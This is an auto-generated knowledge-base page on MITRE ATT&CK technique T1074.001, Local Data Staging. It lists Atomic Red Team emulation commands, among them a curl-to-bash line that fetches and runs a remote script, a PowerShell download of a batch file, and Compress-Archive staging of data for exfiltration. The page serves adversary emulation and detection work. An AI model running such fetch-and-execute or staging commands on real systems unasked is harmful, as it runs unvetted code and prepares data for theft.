
# Local Data Staging

## Description

### MITRE Description

> Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.

## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: None
* Permissions: None
* Platforms: ['Linux', 'macOS', 'Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1074/001

## Potential Commands

```
Compress-Archive -Path PathToAtomicsFolder\T1074.001\bin\Folder_to_zip -DestinationPath #{output_file} -Force
Compress-Archive -Path #{input_file} -DestinationPath $env:TEMP\Folder_to_zip.zip -Force
Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat" -OutFile $env:TEMP\discovery.bat
curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh | bash -s > /tmp/T1074.001_discovery.log
```

## Commands Dataset

```
[{'command': 'Invoke-WebRequest '
             '"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat" '
             '-OutFile $env:TEMP\\discovery.bat\n',
  'name': None,
  'source': 'atomics/T1074.001/T1074.001.yaml'},
 {'command': 'curl -s '
             'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh '
             '| bash -s > /tmp/T1074.001_discovery.log\n',
  'name': None,
  'source': 'atomics/T1074.001/T1074.001.yaml'},
 {'command': 'Compress-Archive -Path #{input_file} -DestinationPath '
             '$env:TEMP\\Folder_to_zip.zip -Force\n',
  'name': None,
  'source': 'atomics/T1074.001/T1074.001.yaml'},
 {'command': 'Compress-Archive -Path '
             'PathToAtomicsFolder\\T1074.001\\bin\\Folder_to_zip '
             '-DestinationPath #{output_file} -Force\n',
  'name': None,
  'source': 'atomics/T1074.001/T1074.001.yaml'}]
```

## Potential Detections

```json

```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - Data Staged: Local Data Staging': {'atomic_tests': [{'auto_generated_guid': '107706a5-6f9f-451a-adae-bab8c667829f',
                                                                               'description': 'Utilize '
                                                                                              'powershell '
                                                                                              'to '
                                                                                              'download '
                                                                                              'discovery.bat '
                                                                                              'and '
                                                                                              'save '
                                                                                              'to '
                                                                                              'a '
                                                                                              'local '
                                                                                              'file. '
                                                                                              'This '
                                                                                              'emulates '
                                                                                              'an '
                                                                                              'attacker '
                                                                                              'downloading '
                                                                                              'data '
                                                                                              'collection '
                                                                                              'tools '
                                                                                              'onto '
                                                                                              'the '
                                                                                              'host. '
                                                                                              'Upon '
                                                                                              'execution,\n'
                                                                                              'verify '
                                                                                              'that '
                                                                                              'the '
                                                                                              'file '
                                                                                              'is '
                                                                                              'saved '
                                                                                              'in '
                                                                                              'the '
                                                                                              'temp '
                                                                                              'directory.\n',
                                                                               'executor': {'cleanup_command': 'Remove-Item '
                                                                                                               '-Force '
                                                                                                               '#{output_file} '
                                                                                                               '-ErrorAction '
                                                                                                               'Ignore\n',
                                                                                            'command': 'Invoke-WebRequest '
                                                                                                       '"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat" '
                                                                                                       '-OutFile '
                                                                                                       '#{output_file}\n',
                                                                                            'name': 'powershell'},
                                                                               'input_arguments': {'output_file': {'default': '$env:TEMP\\discovery.bat',
                                                                                                                   'description': 'Location '
                                                                                                                                  'to '
                                                                                                                                  'save '
                                                                                                                                  'downloaded '
                                                                                                                                  'discovery.bat '
                                                                                                                                  'file',
                                                                                                                   'type': 'Path'}},
                                                                               'name': 'Stage '
                                                                                       'data '
                                                                                       'from '
                                                                                       'Discovery.bat',
                                                                               'supported_platforms': ['windows']},
                                                                              {'auto_generated_guid': '39ce0303-ae16-4b9e-bb5b-4f53e8262066',
                                                                               'description': 'Utilize '
                                                                                              'curl '
                                                                                              'to '
                                                                                              'download '
                                                                                              'discovery.sh '
                                                                                              'and '
                                                                                              'execute '
                                                                                              'a '
                                                                                              'basic '
                                                                                              'information '
                                                                                              'gathering '
                                                                                              'shell '
                                                                                              'script\n',
                                                                               'executor': {'command': 'curl '
                                                                                                       '-s '
                                                                                                       'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh '
                                                                                                       '| '
                                                                                                       'bash '
                                                                                                       '-s '
                                                                                                       '> '
                                                                                                       '#{output_file}\n',
                                                                                            'name': 'bash'},
                                                                               'input_arguments': {'output_file': {'default': '/tmp/T1074.001_discovery.log',
                                                                                                                   'description': 'Location '
                                                                                                                                  'to '
                                                                                                                                  'save '
                                                                                                                                  'downloaded '
                                                                                                                                  'discovery.bat '
                                                                                                                                  'file',
                                                                                                                   'type': 'Path'}},
                                                                               'name': 'Stage '
                                                                                       'data '
                                                                                       'from '
                                                                                       'Discovery.sh',
                                                                               'supported_platforms': ['linux',
                                                                                                       'macos']},
                                                                              {'auto_generated_guid': 'a57fbe4b-3440-452a-88a7-943531ac872a',
                                                                               'description': 'Use '
                                                                                              'living '
                                                                                              'off '
                                                                                              'the '
                                                                                              'land '
                                                                                              'tools '
                                                                                              'to '
                                                                                              'zip '
                                                                                              'a '
                                                                                              'file '
                                                                                              'and '
                                                                                              'stage '
                                                                                              'it '
                                                                                              'in '
                                                                                              'the '
                                                                                              'Windows '
                                                                                              'temporary '
                                                                                              'folder '
                                                                                              'for '
                                                                                              'later '
                                                                                              'exfiltration. '
                                                                                              'Upon '
                                                                                              'execution, '
                                                                                              'Verify '
                                                                                              'that '
                                                                                              'a '
                                                                                              'zipped '
                                                                                              'folder '
                                                                                              'named '
                                                                                              'Folder_to_zip.zip\n'
                                                                                              'was '
                                                                                              'placed '
                                                                                              'in '
                                                                                              'the '
                                                                                              'temp '
                                                                                              'directory.\n',
                                                                               'executor': {'cleanup_command': 'Remove-Item '
                                                                                                               '-Path '
                                                                                                               '#{output_file} '
                                                                                                               '-ErrorAction '
                                                                                                               'Ignore\n',
                                                                                            'command': 'Compress-Archive '
                                                                                                       '-Path '
                                                                                                       '#{input_file} '
                                                                                                       '-DestinationPath '
                                                                                                       '#{output_file} '
                                                                                                       '-Force\n',
                                                                                            'name': 'powershell'},
                                                                               'input_arguments': {'input_file': {'default': 'PathToAtomicsFolder\\T1074.001\\bin\\Folder_to_zip',
                                                                                                                  'description': 'Location '
                                                                                                                                 'of '
                                                                                                                                 'file '
                                                                                                                                 'or '
                                                                                                                                 'folder '
                                                                                                                                 'to '
                                                                                                                                 'zip',
                                                                                                                  'type': 'Path'},
                                                                                                   'output_file': {'default': '$env:TEMP\\Folder_to_zip.zip',
                                                                                                                   'description': 'Location '
                                                                                                                                  'to '
                                                                                                                                  'save '
                                                                                                                                  'zipped '
                                                                                                                                  'file '
                                                                                                                                  'or '
                                                                                                                                  'folder',
                                                                                                                   'type': 'Path'}},
                                                                               'name': 'Zip '
                                                                                       'a '
                                                                                       'Folder '
                                                                                       'with '
                                                                                       'PowerShell '
                                                                                       'for '
                                                                                       'Staging '
                                                                                       'in '
                                                                                       'Temp',
                                                                               'supported_platforms': ['windows']}],
                                                             'attack_technique': 'T1074.001',
                                                             'display_name': 'Data '
                                                                             'Staged: '
                                                                             'Local '
                                                                             'Data '
                                                                             'Staging'}}]
```

# Tactics


* [Collection](../tactics/Collection.md)


# Mitigations

None

# Actors


* [APT3](../actors/APT3.md)

* [Lazarus Group](../actors/Lazarus-Group.md)
    
* [Leviathan](../actors/Leviathan.md)
    
* [Honeybee](../actors/Honeybee.md)
    
* [APT28](../actors/APT28.md)
    
* [FIN5](../actors/FIN5.md)
    
* [Patchwork](../actors/Patchwork.md)
    
* [FIN6](../actors/FIN6.md)
    
* [menuPass](../actors/menuPass.md)
    
* [Threat Group-3390](../actors/Threat-Group-3390.md)
    
* [Dragonfly 2.0](../actors/Dragonfly-2.0.md)
    
* [TEMP.Veles](../actors/TEMP.Veles.md)
    
* [Soft Cell](../actors/Soft-Cell.md)
    
* [Machete](../actors/Machete.md)
    
